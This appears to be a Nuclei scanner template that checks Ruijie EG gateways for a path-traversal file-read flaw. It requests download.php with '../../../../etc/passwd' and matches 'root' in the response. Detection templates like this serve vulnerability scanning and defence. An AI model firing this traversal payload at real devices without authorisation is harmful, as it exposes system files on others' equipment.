id: ruijie-EG-fileDownload

info:
  name: 锐捷EG文件读取
  author: str1am
  severity: high
  tags: ruijie

requests:
  - method: GET
    path:
      - "{{BaseURL}}/download.php?a=read_txt&file=../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "data"
          - "status"
          - "root"
        part: body
        condition: and
